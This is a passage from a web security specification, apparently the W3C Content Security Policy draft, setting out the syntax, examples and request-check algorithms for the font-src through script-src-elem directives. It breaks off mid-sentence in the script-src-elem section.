This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check⑥
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②⑥
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③⑥
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable}, `font-src`
    and `policy`{.variable} is \"`No`\", return \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value②②
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.4.2. ]{.secno}[ `font-src` Post-request check ]{.content}[](#font-src-post-request){.self-link} {#font-src-post-request .algorithm .heading .settled algorithm="font-src Post-request check" level="6.1.4.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check⑦
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②⑦
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①③
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③⑦
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable}, `font-src`
    and `policy`{.variable} is \"`No`\", return \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value②③
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.5. ]{.secno}[`frame-src`]{.content}[](#directive-frame-src){.self-link} {#directive-frame-src .heading .settled level="6.1.5"}

The [frame-src]{#frame-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the URLs which may be loaded into [child
navigables](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable){#ref-for-child-navigable①
link-type="dfn"}. The syntax for the directive's name and value is
described by the following ABNF:

    directive-name  = "frame-src"
    directive-value = serialized-source-list

::: {#example-4f75856d .example}
[](#example-4f75856d){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: frame-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `frame-src`'s [source
list](#source-lists){#ref-for-source-lists⑤ link-type="dfn"}:

``` highlight
<iframe src="https://example.org/">
</iframe>
```
:::

##### [6.1.5.1. ]{.secno}[ `frame-src` Pre-request check ]{.content}[](#frame-src-pre-request){.self-link} {#frame-src-pre-request .algorithm .heading .settled algorithm="frame-src Pre-request check" level="6.1.5.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check⑦
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②⑧
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③⑧
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `frame-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value②④
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.5.2. ]{.secno}[ `frame-src` Post-request check ]{.content}[](#frame-src-post-request){.self-link} {#frame-src-post-request .algorithm .heading .settled algorithm="frame-src Post-request check" level="6.1.5.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check⑧
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②⑨
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①④
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③⑨
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `frame-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value②⑤
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.6. ]{.secno}[`img-src`]{.content}[](#directive-img-src){.self-link} {#directive-img-src .heading .settled level="6.1.6"}

The [img-src]{#img-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the URLs from which image resources may be loaded.
The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "img-src"
    directive-value = serialized-source-list

This directive controls
[requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③⓪
link-type="dfn"} which load images. More formally, this includes
[requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③①
link-type="dfn"} whose
[destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination⑥
link-type="dfn"} is \"`image`\"
[\[FETCH\]](#biblio-fetch "Fetch Standard"){link-type="biblio"}.

::: {#example-7fda6ee0 .example}
[](#example-7fda6ee0){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: img-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `img-src`'s [source
list](#source-lists){#ref-for-source-lists⑥ link-type="dfn"}:

``` highlight
<img src="https://example.org/img">
```
:::

##### [6.1.6.1. ]{.secno}[ `img-src` Pre-request check ]{.content}[](#img-src-pre-request){.self-link} {#img-src-pre-request .algorithm .heading .settled algorithm="img-src Pre-request check" level="6.1.6.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check⑧
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③②
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④⓪
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable}, `img-src`
    and `policy`{.variable} is \"`No`\", return \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value②⑥
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.6.2. ]{.secno}[ `img-src` Post-request check ]{.content}[](#img-src-post-request){.self-link} {#img-src-post-request .algorithm .heading .settled algorithm="img-src Post-request check" level="6.1.6.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check⑨
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③③
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①⑤
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④①
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable}, `img-src`
    and `policy`{.variable} is \"`No`\", return \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value②⑦
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.7. ]{.secno}[`manifest-src`]{.content}[](#directive-manifest-src){.self-link} {#directive-manifest-src .heading .settled level="6.1.7"}

The [manifest-src]{#manifest-src .dfn .dfn-paneled dfn-type="dfn"
export=""} directive restricts the URLs from which application manifests
may be loaded
[\[APPMANIFEST\]](#biblio-appmanifest "Web Application Manifest"){link-type="biblio"}.
The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "manifest-src"
    directive-value = serialized-source-list

::: {#example-49db23b1 .example}
[](#example-49db23b1){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: manifest-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `manifest-src`'s [source
list](#source-lists){#ref-for-source-lists⑦ link-type="dfn"}:

``` highlight
<link rel="manifest" href="https://example.org/manifest">
```
:::

##### [6.1.7.1. ]{.secno}[ `manifest-src` Pre-request check ]{.content}[](#manifest-src-pre-request){.self-link} {#manifest-src-pre-request .algorithm .heading .settled algorithm="manifest-src Pre-request check" level="6.1.7.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check⑨
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③④
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④②
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `manifest-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value②⑧
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.7.2. ]{.secno}[ `manifest-src` Post-request check ]{.content}[](#manifest-src-post-request){.self-link} {#manifest-src-post-request .algorithm .heading .settled algorithm="manifest-src Post-request check" level="6.1.7.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①⓪
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③⑤
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①⑥
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④③
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `manifest-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value②⑨
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.8. ]{.secno}[`media-src`]{.content}[](#directive-media-src){.self-link} {#directive-media-src .heading .settled level="6.1.8"}

The [media-src]{#media-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the URLs from which video, audio, and associated
text track resources may be loaded. The syntax for the directive's name
and value is described by the following ABNF:

    directive-name  = "media-src"
    directive-value = serialized-source-list

::: {#example-ae1d2bb7 .example}
[](#example-ae1d2bb7){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: media-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `media-src`'s [source
list](#source-lists){#ref-for-source-lists⑧ link-type="dfn"}:

``` highlight
<audio src="https://example.org/audio"></audio>
<video src="https://example.org/video">
    <track kind="subtitles" src="https://example.org/subtitles">
</video>
```
:::

##### [6.1.8.1. ]{.secno}[ `media-src` Pre-request check ]{.content}[](#media-src-pre-request){.self-link} {#media-src-pre-request .algorithm .heading .settled algorithm="media-src Pre-request check" level="6.1.8.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①⓪
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③⑥
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④④
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `media-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value③⓪
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.8.2. ]{.secno}[ `media-src` Post-request check ]{.content}[](#media-src-post-request){.self-link} {#media-src-post-request .algorithm .heading .settled algorithm="media-src Post-request check" level="6.1.8.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①①
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③⑦
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①⑦
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④⑤
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `media-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value③①
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.9. ]{.secno}[`object-src`]{.content}[](#directive-object-src){.self-link} {#directive-object-src .heading .settled level="6.1.9"}

The [object-src]{#object-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the URLs from which plugin content may be loaded.
The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "object-src"
    directive-value = serialized-source-list

::: {#example-567c9ecc .example}
[](#example-567c9ecc){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: object-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `object-src`'s [source
list](#source-lists){#ref-for-source-lists⑨ link-type="dfn"}:

``` highlight
<embed src="https://example.org/flash"></embed>
<object data="https://example.org/flash"></object>
```
:::

If plugin content is loaded without an associated URL (perhaps an
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element){#ref-for-the-object-element
link-type="element"} element lacks a
[`data`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data){#ref-for-attr-object-data
link-type="element-sub"} attribute, but loads some default plugin based
on the specified `type`), it MUST be blocked if `object-src`'s value is
`'none'`, but will otherwise be allowed.

[Note:]{.marker} The `object-src` directive acts upon any request made
on behalf of an
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element){#ref-for-the-object-element①
link-type="element"} or
[`embed`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element){#ref-for-the-embed-element
link-type="element"} element. This includes requests which would
populate the [child
navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable){#ref-for-child-navigable②
link-type="dfn"} generated by the former two (also including
navigations). This is true even when the data is semantically equivalent
to content which would otherwise be restricted by another directive,
such as an
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element){#ref-for-the-object-element②
link-type="element"} element with a `text/html` MIME type.

[Note:]{.marker} When a plugin resource is navigated to directly (that
is, as a [plugin](https://html.spec.whatwg.org/#plugin){#ref-for-plugin
link-type="dfn"} inside a
[navigable](https://html.spec.whatwg.org/#navigable){#ref-for-navigable②
link-type="dfn"}, and not as an embedded subresource via
[`embed`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element){#ref-for-the-embed-element①
link-type="element"} or
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element){#ref-for-the-object-element③
link-type="element"}), any
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④⑥
link-type="dfn"} delivered along with that resource will be applied to
the resulting
[`Document`{.idl}](https://dom.spec.whatwg.org/#document){#ref-for-document⑧
link-type="idl"}. This means, for instance, that developers can prevent
the execution of arbitrary resources as plugin content by delivering the
policy `object-src 'none'` along with a response. Given plugins\' power
(and the sometimes-interesting security model presented by Flash and
others), this could mitigate the risk of attack vectors like [Rosetta
Flash](https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/).

##### [6.1.9.1. ]{.secno}[ `object-src` Pre-request check ]{.content}[](#object-src-pre-request){.self-link} {#object-src-pre-request .algorithm .heading .settled algorithm="object-src Pre-request check" level="6.1.9.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①①
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③⑧
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④⑦
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `object-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value③②
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.9.2. ]{.secno}[ `object-src` Post-request check ]{.content}[](#object-src-post-request){.self-link} {#object-src-post-request .algorithm .heading .settled algorithm="object-src Post-request check" level="6.1.9.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①②
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request③⑨
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①⑧
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④⑧
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `object-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value③③
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.10. ]{.secno}[`script-src`]{.content}[](#directive-script-src){.self-link} {#directive-script-src .heading .settled level="6.1.10"}

The [script-src]{#script-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the locations from which scripts may be executed.
This includes not only URLs loaded directly into
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script③
link-type="element"} elements, but also things like inline script blocks
and XSLT stylesheets
[\[XSLT\]](#biblio-xslt "XSL Transformations (XSLT) Version 1.0"){link-type="biblio"}
which can trigger script execution. The syntax for the directive's name
and value is described by the following ABNF:

    directive-name  = "script-src"
    directive-value = serialized-source-list

The `script-src` directive acts as a default fallback for all
[script-like](https://fetch.spec.whatwg.org/#request-destination-script-like){#ref-for-request-destination-script-like②
link-type="dfn"} destinations (including worker-specific destinations if
[`worker-src`](#worker-src){#ref-for-worker-src② link-type="dfn"} is not
present). Unless granularity is desired `script-src` should be used in
favor of [`script-src-attr`](#script-src-attr){#ref-for-script-src-attr②
link-type="dfn"} and
[`script-src-elem`](#script-src-elem){#ref-for-script-src-elem③
link-type="dfn"} as in most situations there is no particular reason to
have separate lists of permissions for inline event handlers and
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script④
link-type="element"} elements.

The `script-src` directive governs six things:

1.  Script
    [requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④⓪
    link-type="dfn"} MUST pass through [§ 4.1.2 Should request be
    blocked by Content Security
    Policy?](#should-block-request){#ref-for-should-block-request④}.

2.  Script
    [responses](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①⑨
    link-type="dfn"} MUST pass through [§ 4.1.3 Should response to
    request be blocked by Content Security
    Policy?](#should-block-response){#ref-for-should-block-response④}.

3.  Inline
    [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script){#ref-for-script⑤
    link-type="element"} blocks MUST pass through [§ 4.2.3 Should
    element's inline type behavior be blocked by Content Security
    Policy?](#should-block-inline){#ref-for-should-block-inline④}. Their
    behavior will be blocked unless every policy allows inline script,
    either implicitly by not specifying a `script-src` (or
    `default-src`) directive, or explicitly, by specifying
    \"`unsafe-inline`\", a
    [nonce-source](#grammardef-nonce-source){#ref-for-grammardef-nonce-source②
    link-type="grammar"} or a
    [hash-source](#grammardef-hash-source){#ref-for-grammardef-hash-source②
    link-type="grammar"} that matches the inline block.

4.  The following JavaScript execution sinks are gated on the
    \"`unsafe-eval`\" and \"`trusted-types-eval`\" source expressions:

    - [`eval()`{.idl}](https://tc39.github.io/ecma262#sec-eval-x){#ref-for-sec-eval-x①
      link-type="idl"}

    - [`Function()`{.idl}](https://tc39.github.io/ecma262#sec-function-objects){#ref-for-sec-function-objects
      link-type="idl"}

    - [`setTimeout()`{.idl}](https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout){#ref-for-dom-settimeout
      link-type="idl"} with an initial argument which is not callable.

    - [`setInterval()`{.idl}](https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval){#ref-for-dom-setinterval
      link-type="idl"} with an initial argument which is not callable.

    [Note:]{.marker} If a user agent implements non-standard sinks like
    `setImmediate()` or `execScript()`, they SHOULD also be gated on
    \"`unsafe-eval`\". Note: Since \"`unsafe-eval`\" acts as a global
    page flag,
    [`script-src-attr`](#script-src-attr){#ref-for-script-src-attr③
    link-type="dfn"} and
    [`script-src-elem`](#script-src-elem){#ref-for-script-src-elem④
    link-type="dfn"} are not used when performing this check, instead
    `script-src` (or it's fallback directive) is always used.

5.  The following WebAssembly execution sinks are gated on the
    \"`wasm-unsafe-eval`\" or the \"`unsafe-eval`\" source expressions:

    - [`new WebAssembly.Module()`{.idl}](https://webassembly.github.io/spec/js-api/#dom-module-module){#ref-for-dom-module-module
      link-type="idl"}

    - [`WebAssembly.compile()`{.idl}](https://webassembly.github.io/spec/js-api/#dom-webassembly-compile){#ref-for-dom-webassembly-compile
      link-type="idl"}

    - [`WebAssembly.compileStreaming()`{.idl}](https://webassembly.github.io/spec/web-api/#dom-webassembly-compilestreaming){#ref-for-dom-webassembly-compilestreaming
      link-type="idl"}

    - [`WebAssembly.instantiate()`{.idl}](https://webassembly.github.io/spec/js-api/#dom-webassembly-instantiate){#ref-for-dom-webassembly-instantiate
      link-type="idl"}

    - [`WebAssembly.instantiateStreaming()`{.idl}](https://webassembly.github.io/spec/web-api/#dom-webassembly-instantiatestreaming){#ref-for-dom-webassembly-instantiatestreaming
      link-type="idl"}

    [Note:]{.marker} the \"`wasm-unsafe-eval`\" source expression is the
    more specific source expression. In particular, \"`unsafe-eval`\"
    permits both compilation (and instantiation) of WebAssembly and, for
    example, the use of the \"`eval`\" operation in JavaScript. The
    \"`wasm-unsafe-eval`\" source expression only permits WebAssembly
    and does not affect JavaScript.

6.  Navigation to `javascript:` URLs MUST pass through [§ 4.2.3 Should
    element's inline type behavior be blocked by Content Security
    Policy?](#should-block-inline){#ref-for-should-block-inline⑤}. Such
    navigations will only execute script if every policy allows inline
    script, as per #3 above.

##### [6.1.10.1. ]{.secno}[ `script-src` Pre-request check ]{.content}[](#script-src-pre-request){.self-link} {#script-src-pre-request .algorithm .heading .settled algorithm="script-src Pre-request check" level="6.1.10.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①②
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④①
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object④⑨
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing [§ 6.7.1.1 Script directives
    pre-request check](#script-pre-request) on `request`{.variable},
    this directive, and `policy`{.variable}.

##### [6.1.10.2. ]{.secno}[ `script-src` Post-request check ]{.content}[](#script-src-post-request){.self-link} {#script-src-post-request .algorithm .heading .settled algorithm="script-src Post-request check" level="6.1.10.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check①③
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request④②
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response②⓪
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤⓪
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing [§ 6.7.1.2 Script directives
    post-request check](#script-post-request) on `request`{.variable},
    `response`{.variable}, this directive, and `policy`{.variable}.

##### [6.1.10.3. ]{.secno}[ `script-src` Inline Check ]{.content}[](#script-src-inline){.self-link} {#script-src-inline .algorithm .heading .settled algorithm="script-src Inline Check" level="6.1.10.3"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check④
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element③
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object⑤①
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Assert: `element`{.variable} is not null or `type`{.variable} is
    \"`navigation`\".

2.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

3.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `script-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

4.  If the result of executing [§ 6.7.3.3 Does element match source list
    for type and source?](#match-element-to-source-list) on
    `element`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value③④
    link-type="dfn"}, `type`{.variable}, and `source`{.variable}, is
    \"`Does Not Match`\", return \"`Blocked`\".

5.  Return \"`Allowed`\".

#### [6.1.11. ]{.secno}[`script-src-elem`]{.content}[](#directive-script-src-elem){.self-link} {#directive-script-src-elem .heading .settled level="6.1.11"}

The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "script-src-elem"
    directive-value = serialized-source-list

The [script-src-elem]{#script-src-elem .dfn .dfn-paneled dfn-type="dfn"
export=""} directive applies to all script requests and script blocks.
Attributes that execute script (inline event handlers) are controlled
via [`script-src-attr`](#script-src-attr){#ref-for-script-src-attr④
link-type="dfn"}.

As such, the following differences exist when comparing to `script-src`:

